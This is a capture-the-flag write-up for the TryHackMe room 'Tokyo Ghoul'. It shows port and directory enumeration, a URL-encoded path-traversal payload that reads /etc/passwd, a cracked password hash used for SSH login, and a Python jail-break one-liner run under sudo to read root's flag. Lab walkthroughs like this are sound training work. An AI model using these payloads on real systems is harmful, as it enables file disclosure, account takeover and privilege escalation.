# 66 - Tokyo Ghoul (LFI, python jail break exploitation)

Room Link --> [https://tryhackme.com/room/tokyoghoul666](https://tryhackme.com/room/tokyoghoul666)

## Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.249.81 -p- -T4 -sV

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
```
{% endcode %}

#### FTP Enumeration

<figure><img src=".gitbook/assets/image (441).png" alt=""><figcaption></figcaption></figure>

Webpage source code:

<figure><img src=".gitbook/assets/image (442).png" alt=""><figcaption></figcaption></figure>

`/jsonroom.html`&#x20;

<figure><img src=".gitbook/assets/image (443).png" alt=""><figcaption></figcaption></figure>

The executable file.

<figure><img src=".gitbook/assets/image (444).png" alt=""><figcaption></figcaption></figure>

We got the key

<figure><img src=".gitbook/assets/image (445).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (446).png" alt=""><figcaption></figcaption></figure>

Using the passord for the image. `You_found_1t` .

<figure><img src=".gitbook/assets/image (447).png" alt=""><figcaption></figcaption></figure>

Cracked with cyberchef `d1r3c70ry_center` .

<figure><img src=".gitbook/assets/image (448).png" alt=""><figcaption></figcaption></figure>

Navigating to the directory

<figure><img src=".gitbook/assets/image (449).png" alt=""><figcaption></figcaption></figure>

#### Gobuster enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.249.81/d1r3c70ry_center/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error

/claim
```
{% endcode %}

<figure><img src=".gitbook/assets/image (450).png" alt=""><figcaption></figcaption></figure>

maybe we can change it to get back and get the /etc/passwd

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*Uc7v9vpZLCfVpFGsxMZh5g.png" alt="" height="175" width="700"><figcaption></figcaption></figure>

This payload worked:

```bash
%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# so i used burpsuite decoder to get the HTML encoded form of / and ..
# then add "etc" and "passwd"
# the online HTML encoders did not work for me.
```

<figure><img src=".gitbook/assets/image (451).png" alt=""><figcaption></figcaption></figure>

His username and password.

{% code overflow="wrap" %}
```bash
kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0

# cracked
password123
```
{% endcode %}

Cracking with john

<figure><img src=".gitbook/assets/image (452).png" alt=""><figcaption></figcaption></figure>

### Initial Access

And we can login via SSH.

<pre><code><strong>kamishiro : password123
</strong></code></pre>

### Priv Esc

THere is a `jail.py` file in the home dir.

`sudo -l` - we can run this file with python3 as sudo.

Googling python jail break and found this [blog](https://anee.me/escaping-python-jails-849c65cf306e)

{% code overflow="wrap" %}
```bash
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
```
{% endcode %}

<figure><img src=".gitbook/assets/image (453).png" alt=""><figcaption></figcaption></figure>

Done!

